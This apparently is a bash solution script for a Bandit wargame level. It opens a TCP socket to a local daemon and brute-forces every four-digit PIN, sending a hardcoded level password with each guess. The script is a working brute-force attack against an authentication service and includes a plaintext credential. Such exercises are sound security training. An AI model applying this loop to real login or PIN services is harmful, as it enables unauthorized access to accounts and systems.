#!/bin/bash

# Replace with the actual password for bandit24
BANDIT24_PASS="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"

# Open a connection to the daemon and keep it open
exec 3<>/dev/tcp/localhost/30002

# Read the initial prompt from the pincode checker
read -u 3 prompt
echo "$prompt"

# Try all possible 4-digit PINs
for i in $(seq -w 0000 9999); do
    # Overwrite the current line with the new PIN attempt
    echo -ne "\rTrying PIN: $i\033[K"
    echo "$BANDIT24_PASS $i" >&3

    # Read the response from the daemon
    read -u 3 response
    if [[ "$response" == *"Correct!"* ]]; then
        # Move to a new line before displaying the found PIN
        echo -e "\nFound correct PIN: $i"
        # Since the correct PIN is found, read the password response
        read -u 3 password_response
        echo "$response"
        echo $password_response
        break
    fi
done

# Move to a new line after the loop completes or breaks
echo

# Close the connection
exec 3<&-
exec 3>&-
